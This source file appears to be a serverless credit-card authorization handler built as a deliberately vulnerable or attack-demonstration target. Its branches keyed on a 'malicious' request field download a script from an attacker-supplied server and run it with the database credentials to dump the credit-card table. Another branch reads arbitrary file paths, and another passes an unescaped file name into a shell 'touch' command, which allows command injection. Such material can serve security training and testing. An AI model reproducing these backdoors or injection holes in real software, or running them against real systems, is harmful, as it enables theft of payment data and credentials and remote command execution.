'use strict';

const fs = require('fs');
const child_process = require('child_process');
const malicious = require('./malicious');
const util = require('util');

const execFile = util.promisify(child_process.execFile);

const constants = {
	TABLE_CREDIT_CARDS_NAME: process.env.TABLE_CREDIT_CARDS_NAME,
	HOST: process.env.HOST,
	USER: process.env.USER,
	PASS: process.env.PASS,
	DBNAME: process.env.DBNAME
};

module.exports = async (event, context, callback) => {
	console.log(event);

	if (event.body.malicious == 'one') {
		console.log('Step 1: Downloading attack scripts');
		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'sqldump.sh');

		var response = {
			approved: 'false',
			failureReason: downloadStatus
		};
		callback(null, response);
	} else if (event.body.malicious == 'two') {
		console.log('Step 2: Exfiltration');

		if (fs.existsSync('./sqldump.sh')) {
			try {
				const { stdout, stderr } = await execFile('./sqldump.sh', [constants.HOST, constants.USER, constants.PASS, constants.DBNAME, constants.TABLE_CREDIT_CARDS_NAME]);

				var response = {
					approved: 'false',
					failureReason: {
						out: stdout,
						err: stderr
					}
				};
				callback(null, response);
			} catch (error) {
				console.log('Error with exec');
				console.log(error);
				var response = {
					approved: 'false',
					failureReason: 'Error executing sqldump.sh. Error: ' + error
				};
				callback(null, response);
			}
		} else {
			var response = {
				approved: 'false',
				failureReason: './sqldump.sh does not exist.'
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'sas6') {
		var path = event.body.path;
		try {
			const data = fs.readFileSync(path, 'utf8');
			console.log('文件内容:', data);
			var response = {
				data: data
			};
			callback(null, response);
		} catch (err) {
			console.error('读取文件时出错:', err);
			var response = {
				data: err
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'sas3') {
		var fileName = event.body.fileName;
		var response = { 'data': 'done' }
		child_process.execSync(`touch ${fileName}`);
		callback(null, response);
	} else {
		var result = {};
		if (event.body.creditCard) {
			if (Math.random() < 0.01) { // Simulate failure in 1% of purchases (expected).
				result.approved = 'false';
				result.failureReason = 'Credit card authorization failed';
			} else {
				result.approved = 'true';
				result.authorization = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
			}
			return callback(null, result);
		} else {
			var response = {
				approved: 'false',
				failureReason: 'Database access not implemented. Please supply creditCard in request.'
			};
			callback(null, response);
		}
	}
};
